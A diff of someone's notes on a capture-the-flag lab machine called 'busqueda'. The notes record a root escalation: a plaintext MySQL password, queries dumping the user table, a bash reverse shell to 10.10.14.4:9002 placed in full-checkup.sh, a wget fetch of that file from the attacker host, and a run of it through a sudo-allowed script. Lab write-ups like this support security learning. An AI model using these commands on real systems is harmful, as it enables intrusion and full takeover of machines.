@@ -62,7 +62,7 @@ User svc may run the following commands on busqueda:
 
 found that its runs some docker images 
 
-udo python3 /opt/scripts/system-checkup.py lrr
+sudo python3 /opt/scripts/system-checkup.py lrr
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
      docker-ps     : List running docker containers
@@ -82,7 +82,45 @@ mysql -h 127.0.0.1 -u gitea -pyuiu1hoiu4i5ho1uh
 
 mysql commands 
 
-show 
+show databases;
+select database;
+show tables;
+select * from user;
+
+created a file called fuul-checkup.sh
+
+cat full-checkup.sh 
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.4/9002 0>&1'
+
+pulled the file into the machine 
+
+ran 
+
+wget http://10.10.14.4:8080/full-checkup.sh
+wget http://10.10.14.4:8080/full-checkup.sh
+--2026-10-29 11:48:51--  http://10.10.14.4:8080/full-checkup.sh
+Connecting to 10.10.14.4:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 63 [text/x-sh]
+Saving to: ‘full-checkup.sh’
+
+full-checkup.sh     100%[===================>]      63  --.-KB/s    in 0s      
+
+2026-10-29 11:48:51 (8.15 MB/s) - ‘full-checkup.sh’ saved [63/63]
+
+svc@busqueda:~$ ls
+ls
+full-checkup.sh  user.txt
+svc@busqueda:~$ chmod +x full-checkup.sh
+chmod +x full-checkup.sh
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+<python3 /opt/scripts/system-checkup.py full-checkup
+
+
+got the root shell
+
+
 
 
 
